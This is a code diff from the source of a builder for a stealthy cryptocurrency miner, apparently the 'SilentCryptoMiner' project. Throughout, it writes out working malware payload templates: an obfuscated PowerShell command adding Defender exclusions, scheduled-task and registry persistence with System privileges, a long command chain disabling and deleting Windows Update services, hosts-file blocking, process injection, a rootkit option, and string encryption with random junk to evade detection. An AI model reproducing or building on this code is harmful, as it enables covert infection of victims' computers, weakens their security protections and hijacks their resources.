@@ -80,7 +80,6 @@ namespace SilentCryptoMiner
             try
             {
                 File.Delete(savePath + ".manifest");
-                File.Delete(Environment.GetFolderPath((Environment.SpecialFolder)35) + @"\icon.ico");
                 File.Delete(System.IO.Path.GetTempPath() + @"\" + F.Resources_parent + ".Resources");
             }
             catch { }
@@ -286,14 +285,14 @@ namespace SilentCryptoMiner
                 ExtractExternalFiles(currentDirectory);
 
                 var directoryFilter = F.CheckNonASCII(savePath);
-                if (F.BuildErrorTest(directoryFilter.Length > 0, string.Format("Error: Build path \"{0}\" contains the following illegal special characters: {1}, please choose a build path without any special characters.", savePath, string.Join("", directoryFilter))))
+                if (F.BuildError(directoryFilter.Length > 0, string.Format("Error: Build path \"{0}\" contains the following illegal special characters: {1}, please choose a build path without any special characters.", savePath, string.Join("", directoryFilter))))
                     return false;
-                if (F.BuildErrorTest(!F.txtStartDelay.Text.All(new Func<char, bool>(char.IsDigit)), "Error: Start Delay must be a number."))
+                if (F.BuildError(!F.txtStartDelay.Text.All(new Func<char, bool>(char.IsDigit)), "Error: Start Delay must be a number."))
                     return false;
 
                 var sb = new StringBuilder(Properties.Resources.Loader);
 
-                if (F.BuildErrorTest(!string.Join("", new string[] { F.txtAssemblyVersion1.Text, F.txtAssemblyVersion2.Text, F.txtAssemblyVersion3.Text, F.txtAssemblyVersion4.Text }).All(new Func<char, bool>(char.IsDigit)), "Error: Assembly Version must only contain numbers."))
+                if (F.BuildError(!string.Join("", new string[] { F.txtAssemblyVersion1.Text, F.txtAssemblyVersion2.Text, F.txtAssemblyVersion3.Text, F.txtAssemblyVersion4.Text }).All(new Func<char, bool>(char.IsDigit)), "Error: Assembly Version must only contain numbers."))
                     return false;
 
                 var resource = new StringBuilder(Properties.Resources.resource);
@@ -322,7 +321,7 @@ namespace SilentCryptoMiner
                 RunExternalProgram("cmd", string.Format("cmd /c \"{0}\" --input resource.rc --output resource.o -O coff {1}", paths["windres"], defs), currentDirectory, paths["windreslog"]);
                 File.Delete(paths["resource.rc"]);
                 File.Delete(paths["manifest"]);
-                if (F.BuildErrorTest(!File.Exists(paths["resource.o"]), string.Format("Error: Failed at compiling resources, check the error log at {0}.", paths["windreslog"])))
+                if (F.BuildError(!File.Exists(paths["resource.o"]), string.Format("Error: Failed at compiling resources, check the error log at {0}.", paths["windreslog"])))
                     return false;
                 
                 string shellcodebytes = Encoding.GetEncoding("ISO-8859-1").GetString(ConvertToShellcode(inputFile));
@@ -342,7 +341,7 @@ namespace SilentCryptoMiner
                 RunExternalProgram(paths["tcc"], string.Format("-Wl,-subsystem=windows \"{0}\" {1} \"{2}\" -xa \"{3}\" -m64", filename + ".c", "resource.o", Path.Combine(currentDirectory, @"Includes\syscalls.c"), Path.Combine(currentDirectory, @"Includes\syscallsstubs.asm")), currentDirectory, paths["tcclog"]);
                 File.Delete(paths["resource.o"]);
                 File.Delete(paths["filename"] + ".c");
-                if (F.BuildErrorTest(!File.Exists(paths["filename"] + ".exe"), string.Format("Error: Failed at compiling program, check the error log at {0}.", paths["tcclog"])))
+                if (F.BuildError(!File.Exists(paths["filename"] + ".exe"), string.Format("Error: Failed at compiling program, check the error log at {0}.", paths["tcclog"])))
                     return false;
 
                 if (F.FormAO.toggleRootkit.Checked)
@@ -480,6 +479,11 @@ namespace SilentCryptoMiner
             File.WriteAllText(path, mb.ToString());
         }
 
+        public static void ReplaceEncrypt(StringBuilder source, string id, string value)
+        {
+            source.Replace($"\"{id}\"", $"_rGetString_(\"{F.EncryptString(value)}\")");
+        }
+
         public static void ReplaceGlobals(ref StringBuilder stringb)
         {
             if (F.mineXMR)
@@ -495,7 +499,7 @@ namespace SilentCryptoMiner
             if (F.toggleWDExclusions.Checked)
             {
                 stringb.Replace("DefWDExclusions", "true");
-                stringb.Replace("#DefenderCommands", F.EncryptString(F.defenderCommands));
+                ReplaceEncrypt(stringb, "#WDCOMMANDS", $"-EncodedCommand \"{Convert.ToBase64String(Encoding.Unicode.GetBytes($"<#{F.Randomi(F.rand.Next(2, 5), false)}#> Add-MpPreference <#{F.Randomi(F.rand.Next(2, 5), false)}#> -ExclusionPath @($env:UserProfile,$env:SystemDrive) <#{F.Randomi(F.rand.Next(2, 5), false)}#> -Force <#{F.Randomi(F.rand.Next(2, 5), false)}#>"))}\"");
             }
 
             if (F.FormAO.toggleRootkit.Checked)
@@ -569,7 +573,7 @@ namespace SilentCryptoMiner
                         }
                 }
 
-                if (F.toggleRunSystem.Checked)
+                if (F.toggleRunSystem.Checked && F.toggleAdministrator.Checked)
                 {
                     installdir = "Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)";
                 }
@@ -616,44 +620,54 @@ namespace SilentCryptoMiner
                 stringb.Replace("%v4%", F.txtAssemblyVersion4.Text);
             }
 
-            stringb.Replace("#LIBSPATH", F.EncryptString(@"Google\Libs\"));
-            stringb.Replace("#WATCHDOGPATH", F.EncryptString(@"Google\Telemetry\"));
-            stringb.Replace("#WATCHDOGID", F.EncryptString($"\"{F.watchdogID}\""));
-            stringb.Replace("#XID", F.EncryptString(F.xid));
-            stringb.Replace("#EID", F.EncryptString(F.eid));
-            stringb.Replace("#WATCHDOGNAME", F.EncryptString("sihost64"));
-            stringb.Replace("#TASKSCHADD", F.EncryptString($"cmd /c schtasks /create /f /sc onlogon /rl highest {(F.toggleRunSystem.Checked ? "/ru \"System\"" : "")} /tn \"{F.txtInstallEntryName.Text}\" /tr \"{{0}}\""));
-            stringb.Replace("#TASKSCHREM", F.EncryptString($"cmd /c schtasks /delete /f /tn \"{F.txtInstallEntryName.Text}\""));
-            stringb.Replace("#TASKSCHSTART", F.EncryptString($"cmd /c schtasks /run /tn \"{F.txtInstallEntryName.Text}\""));
-            stringb.Replace("#REGADD", F.EncryptString($"cmd /c reg add \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"{F.txtInstallEntryName.Text}\" /t REG_SZ /f /d \"{{0}}\""));
-            stringb.Replace("#REGREM", F.EncryptString($"cmd /c reg delete \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"{F.txtInstallEntryName.Text}\" /f"));
-            stringb.Replace("#POWERCFG", F.EncryptString(@"cmd /c powercfg /x -hibernate-timeout-ac 0 & powercfg /x -hibernate-timeout-dc 0 & powercfg /x -standby-timeout-ac 0 & powercfg /x -standby-timeout-dc 0"));
-            stringb.Replace("#WUPDATE", F.EncryptString("cmd /c sc stop UsoSvc & sc stop WaaSMedicSvc & sc stop wuauserv & sc stop bits & sc stop dosvc & reg delete HKLM\\SYSTEM\\CurrentControlSet\\Services\\UsoSvc /f & reg delete HKLM\\SYSTEM\\CurrentControlSet\\Services\\WaaSMedicSvc /f & reg delete HKLM\\SYSTEM\\CurrentControlSet\\Services\\wuauserv /f & reg delete HKLM\\SYSTEM\\CurrentControlSet\\Services\\bits /f & reg delete HKLM\\SYSTEM\\CurrentControlSet\\Services\\dosvc /f & takeown /f %SystemRoot%\\System32\\WaaSMedicSvc.dll & icacls %SystemRoot%\\System32\\WaaSMedicSvc.dll /grant *S-1-1-0:F /t /c /l /q & rename %SystemRoot%\\System32\\WaaSMedicSvc.dll WaaSMedicSvc_BAK.dll & reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU /v AUOptions /d 2 /t REG_DWORD /f & reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU /v AutoInstallMinorUpdates /d 0 /t REG_DWORD /f & reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU /v NoAutoUpdate /d 1 /t REG_DWORD /f & reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU /v NoAutoRebootWithLoggedOnUsers /d 1 /t REG_DWORD /f & SCHTASKS /Change /TN \"\\Microsoft\\Windows\\WindowsUpdate\\Automatic App Update\" /DISABLE & SCHTASKS /Change /TN \"\\Microsoft\\Windows\\WindowsUpdate\\Scheduled Start\" /DISABLE & SCHTASKS /Change /TN \"\\Microsoft\\Windows\\WindowsUpdate\\sih\" /DISABLE & SCHTASKS /Change /TN \"\\Microsoft\\Windows\\WindowsUpdate\\sihboot\" /DISABLE & SCHTASKS /Change /TN \"\\Microsoft\\Windows\\UpdateOrchestrator\\UpdateAssistant\" /DISABLE & SCHTASKS /Change /TN \"\\Microsoft\\Windows\\UpdateOrchestrator\\UpdateAssistantCalendarRun\" /DISABLE & SCHTASKS /Change /TN \"\\Microsoft\\Windows\\UpdateOrchestrator\\UpdateAssistantWakeupRun\" /DISABLE"));
-            stringb.Replace("#MINERQUERY", F.EncryptString($"Select CommandLine from Win32_Process WHERE CommandLine LIKE '%{F.minerFind}%'"));
-            stringb.Replace("#GPUQUERY", F.EncryptString("SELECT Name, VideoProcessor FROM Win32_VideoController"));
-            stringb.Replace("#WMISCOPE", F.EncryptString(@"\root\cimv2"));
-            stringb.Replace("#MINERID", F.EncryptString(F.minerFind));
-            stringb.Replace("#SCMD", F.EncryptString("cmd"));
-            stringb.Replace("#CMDSTART", F.EncryptString("cmd /c \"{0}\""));
-            stringb.Replace("#CMDKILL", F.EncryptString("cmd /c taskkill /f /PID \"{0}\""));
-            stringb.Replace("#CMDDELETE", F.EncryptString("cmd /c choice /C Y /N /D Y /T 3 & Del \"{0}\""));
-            stringb.Replace("#SYSTEMROOT", F.EncryptString("SystemRoot"));
-            stringb.Replace("#CONHOST", F.EncryptString("System32\\conhost.exe"));
-            stringb.Replace("#HOSTSPATH", F.EncryptString("drivers/etc/hosts"));
-            stringb.Replace("#HOSTSFORMAT", F.EncryptString("\r\n0.0.0.0       {0}"));
-            stringb.Replace("#RUNPETYPE", F.EncryptString("RunPE.RunPE"));
-            stringb.Replace("#RUNPEMETHOD", F.EncryptString("Run"));
-            stringb.Replace("#INSTALLPATH", F.EncryptString(F.txtInstallFileName.Text));
-            stringb.Replace("#SYSTEMNAME", F.EncryptString("System"));
+            stringb.Replace("$LIBSROOT", F.chkInstall.Checked && F.toggleRunSystem.Checked && F.toggleAdministrator.Checked ? "Environment.SpecialFolder.ProgramFiles" : "Environment.SpecialFolder.ApplicationData");
+            stringb.Replace("$PAYLOADCOMMAND", "string.Format(\"#ECTEMPLATE\", Convert.ToBase64String(Encoding.Unicode.GetBytes(string.Format(\"#STARTPROGRAM\", _rplp_.Replace(\"'\", \"''\")))))");
 
-            stringb.Replace("#STRNVIDIA", F.EncryptString("nvidia"));
-            stringb.Replace("#STRAMD", F.EncryptString("amd"));
+            ReplaceEncrypt(stringb, "#LIBSPATH", @"Google\Libs\");
+            ReplaceEncrypt(stringb, "#WATCHDOGPATH", @"Google\Telemetry\");
+            ReplaceEncrypt(stringb, "#WATCHDOGID", $"\"{F.watchdogID}\"");
+            ReplaceEncrypt(stringb, "#XID", F.xid);
+            ReplaceEncrypt(stringb, "#EID", F.eid);
+            ReplaceEncrypt(stringb, "#WATCHDOGNAME", "sihost64");
 
-            stringb.Replace("#KEY", F.AESKEY);
+            ReplaceEncrypt(stringb, "#WIN7TASKSCHADD", $"/c schtasks /create /f /sc onlogon /rl highest {(F.toggleRunSystem.Checked && F.toggleAdministrator.Checked ? "/ru \"System\"" : "")} /tn \"{F.txtInstallEntryName.Text}\" /tr \"\\\"{{0}}\\\"\"");
+            ReplaceEncrypt(stringb, "#WIN7TASKSCHSTART", $"/c schtasks /run /tn \"{F.txtInstallEntryName.Text}\"");
+
+            ReplaceEncrypt(stringb, "#TASKSCHADD", $"<#{F.Randomi(F.rand.Next(2, 5), false)}#> Register-ScheduledTask -Action (New-ScheduledTaskAction -Execute 'powershell' -Argument '{{2}}') <#{F.Randomi(F.rand.Next(2, 5), false)}#> -Trigger (New-ScheduledTaskTrigger {(F.toggleRunSystem.Checked && F.toggleAdministrator.Checked ? "-AtStartup" : "-AtLogOn")}) <#{F.Randomi(F.rand.Next(2, 5), false)}#> -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DisallowHardTerminate -DontStopIfGoingOnBatteries -DontStopOnIdleEnd -ExecutionTimeLimit (New-TimeSpan -Days 1000)) <#{F.Randomi(F.rand.Next(2, 5), false)}#> -TaskName '{F.txtInstallEntryName.Text.Replace("'", "''")}' {(F.toggleRunSystem.Checked && F.toggleAdministrator.Checked ? "-User 'System'" : "")} -RunLevel 'Highest' -Force <#{F.Randomi(F.rand.Next(2, 5), false)}#>; Copy-Item '{{1}}' -Destination '{{0}}' -Force <#{F.Randomi(F.rand.Next(2, 5), false)}#>; {(F.FormAO.toggleRunInstall.Checked ? $"Start-ScheduledTask <#{F.Randomi(F.rand.Next(2, 5), false)}#> -TaskName '{F.txtInstallEntryName.Text.Replace("'", "''")}';" : "")}");
+            ReplaceEncrypt(stringb, "#TASKSCHREM", $"/c schtasks /delete /f /tn \"{F.txtInstallEntryName.Text}\"");
+            ReplaceEncrypt(stringb, "#REGADD", $"/c reg add \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"{F.txtInstallEntryName.Text}\" /t REG_SZ /f /d \"\\\"{{0}}\\\"\"");
+            ReplaceEncrypt(stringb, "#REGREM", $"/c reg delete \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"{F.txtInstallEntryName.Text}\" /f");
+            ReplaceEncrypt(stringb, "#POWERCFG", @"/c powercfg /x -hibernate-timeout-ac 0 & powercfg /x -hibernate-timeout-dc 0 & powercfg /x -standby-timeout-ac 0 & powercfg /x -standby-timeout-dc 0");
+            ReplaceEncrypt(stringb, "#WUPDATE", "/c sc stop UsoSvc & sc stop WaaSMedicSvc & sc stop wuauserv & sc stop bits & sc stop dosvc & reg delete HKLM\\SYSTEM\\CurrentControlSet\\Services\\UsoSvc /f & reg delete HKLM\\SYSTEM\\CurrentControlSet\\Services\\WaaSMedicSvc /f & reg delete HKLM\\SYSTEM\\CurrentControlSet\\Services\\wuauserv /f & reg delete HKLM\\SYSTEM\\CurrentControlSet\\Services\\bits /f & reg delete HKLM\\SYSTEM\\CurrentControlSet\\Services\\dosvc /f & takeown /f %SystemRoot%\\System32\\WaaSMedicSvc.dll & icacls %SystemRoot%\\System32\\WaaSMedicSvc.dll /grant *S-1-1-0:F /t /c /l /q & rename %SystemRoot%\\System32\\WaaSMedicSvc.dll WaaSMedicSvc_BAK.dll & reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU /v AUOptions /d 2 /t REG_DWORD /f & reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU /v AutoInstallMinorUpdates /d 0 /t REG_DWORD /f & reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU /v NoAutoUpdate /d 1 /t REG_DWORD /f & reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU /v NoAutoRebootWithLoggedOnUsers /d 1 /t REG_DWORD /f & SCHTASKS /Change /TN \"\\Microsoft\\Windows\\WindowsUpdate\\Automatic App Update\" /DISABLE & SCHTASKS /Change /TN \"\\Microsoft\\Windows\\WindowsUpdate\\Scheduled Start\" /DISABLE & SCHTASKS /Change /TN \"\\Microsoft\\Windows\\WindowsUpdate\\sih\" /DISABLE & SCHTASKS /Change /TN \"\\Microsoft\\Windows\\WindowsUpdate\\sihboot\" /DISABLE & SCHTASKS /Change /TN \"\\Microsoft\\Windows\\UpdateOrchestrator\\UpdateAssistant\" /DISABLE & SCHTASKS /Change /TN \"\\Microsoft\\Windows\\UpdateOrchestrator\\UpdateAssistantCalendarRun\" /DISABLE & SCHTASKS /Change /TN \"\\Microsoft\\Windows\\UpdateOrchestrator\\UpdateAssistantWakeupRun\" /DISABLE");
+            ReplaceEncrypt(stringb, "#STARTPROGRAM", $"<#{F.Randomi(F.rand.Next(2, 5), false)}#> Start-Process -FilePath '{{0}}' -Verb RunAs <#{F.Randomi(F.rand.Next(2, 5), false)}#>");
+            ReplaceEncrypt(stringb, "#CMDKILL", "/c taskkill /f /PID \"{0}\"");
+            ReplaceEncrypt(stringb, "#CMDDELETE", "/c choice /C Y /N /D Y /T 3 & Del \"{0}\"");
+
+            ReplaceEncrypt(stringb, "#MINERQUERY", $"Select CommandLine from Win32_Process WHERE CommandLine LIKE '%{F.minerFind}%'");
+            ReplaceEncrypt(stringb, "#GPUQUERY", "SELECT Name, VideoProcessor FROM Win32_VideoController");
+            ReplaceEncrypt(stringb, "#WMISCOPE", @"\root\cimv2");
+            ReplaceEncrypt(stringb, "#MINERID", F.minerFind);
+            ReplaceEncrypt(stringb, "#SCMD", "cmd");
+            ReplaceEncrypt(stringb, "#SPOWERSHELL", "powershell");
+            ReplaceEncrypt(stringb, "#CONHOST", "System32\\conhost.exe");
+            ReplaceEncrypt(stringb, "#HOSTSPATH", "drivers/etc/hosts");
+            ReplaceEncrypt(stringb, "#HOSTSFORMAT", "\r\n0.0.0.0       {0}");
+            ReplaceEncrypt(stringb, "#RUNPETYPE", "RunPE.RunPE");
+            ReplaceEncrypt(stringb, "#RUNPEMETHOD", "Run");
+            ReplaceEncrypt(stringb, "#SHELLCODEMETHOD", "Shellcode");
+            ReplaceEncrypt(stringb, "#INSTALLPATH", F.txtInstallFileName.Text);
+            ReplaceEncrypt(stringb, "#WR64", "WR64.sys");
+            ReplaceEncrypt(stringb, "#ECTEMPLATE", "-EncodedCommand \"{0}\"");
+
+            ReplaceEncrypt(stringb, "#STRNVIDIA", "nvidia");
+            ReplaceEncrypt(stringb, "#STRAMD", "amd");
+            ReplaceEncrypt(stringb, "#STRRNDPATH", $"{F.Randomi(F.rand.Next(10, 20), false)}\\{F.Randomi(F.rand.Next(5, 10), false)}.exe");
+
+            stringb.Replace("#AESKEY", F.AESKEY);
             stringb.Replace("#SALT", F.SALT);
             stringb.Replace("#IV", F.IV);
-            stringb.Replace("#UNAMKEY", F.EncryptString(F.UNAMKEY));
-            stringb.Replace("#UNAMIV", F.EncryptString(F.UNAMIV));
+            ReplaceEncrypt(stringb, "#UNAMKEY", F.UNAMKEY);
+            ReplaceEncrypt(stringb, "#UNAMIV", F.UNAMIV);
 
             stringb.Replace("#RESPARENT", F.Resources_parent);
             stringb.Replace("#RESETH", F.Resources_eth);
@@ -664,8 +678,6 @@ namespace SilentCryptoMiner
             stringb.Replace("#RESRKU", F.Resources_rootkitu);
             stringb.Replace("#RESWR", F.Resources_winring);
             stringb.Replace("#RESRPE", F.Resources_runpe);
-
-            stringb.Replace("$LIBSROOT", F.chkInstall.Checked && F.toggleRunSystem.Checked ? "Environment.SpecialFolder.ProgramFiles" : "Environment.SpecialFolder.ApplicationData");
 
             stringb.Replace("startDelay", F.txtStartDelay.Text);
 
